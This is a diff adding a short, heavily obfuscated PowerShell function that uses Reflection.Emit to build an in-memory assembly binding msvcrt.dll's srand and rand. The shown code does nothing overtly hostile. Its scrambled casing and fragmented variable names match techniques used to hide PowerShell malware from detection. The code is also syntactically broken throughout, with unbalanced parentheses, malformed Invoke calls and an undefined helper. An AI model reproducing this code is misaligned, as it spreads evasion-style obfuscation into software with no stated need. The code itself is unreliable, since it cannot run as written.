@@ -1,0 +1,43 @@
+.(Set-Item VariaBLE:q21s ( [TyPE]('aPpdoMaIn' )));
+
+&(Set-Item VaRiAble:x1RwF ([TYPe]('rEfLECtiOn.emiT.ASseMBLyBUildErAcCesS')));
+ function GET-MsvCRT
+ {
+   $
+   {     DYNaSSeMBly}
+ = &(New-Object 'System.Reflection.AssemblyName'(Win32Lib));
+   $
+   {     aSSEMBlYbUiLdeR}=  $q21s::"CUrREnTdomain"."deFiNEdYNamiCAssEMbLy"($
+   {     DynAsSEMBly},  $x1rWF::"RUN");
+   $
+   {     MoDuLEBuILDER}= $
+   {     asseMBlybUiLDEr}.('DefineDynamicModule'.Invoke((Win32Lib, $
+   {     FAlSe});
+   $
+   {     typeBUILDER}= $
+   {     mOduLeBuILdeR}.('DefineType'.Invoke((msvcrt, ('Public, Class');
+    $
+   {     MeTH_SRaND}= $
+   {     TyPeBuiLder}.("DefineMethod").Invoke( (srand, [Reflection.MethodAttributes] ("Public, Static", [Void], [Type[]] @([Int32]));
+   $
+   {     MetH_rAND}= $
+   {     typeBuIldeR}.(DefineMethod).Invoke( (rand), [Reflection.MethodAttributes] ("Public, Static", [Int32], [Type[]] @());
+   $
+   {     atTR_sRAnd}
+ = &(Get-CustomAttr ('msvcrt.dll' (srand) $
+   {     FAlse};
+   $
+   {     ATTR_RAnd}
+ = &(Get-CustomAttr ('msvcrt.dll' (rand) $
+   {     fAlse};
+   $
+   {     mETH_srANd}.('SetCustomAttribute').Invoke($
+   {     ATtr_srAND}
+   );
+   $
+   {     mETH_RAND}.('SetCustomAttribute').Invoke($
+   {     ATTR_RAND}
+   );
+   return $
+   {     TypeBUIldEr}.('CreateType'.Invoke();
+ }
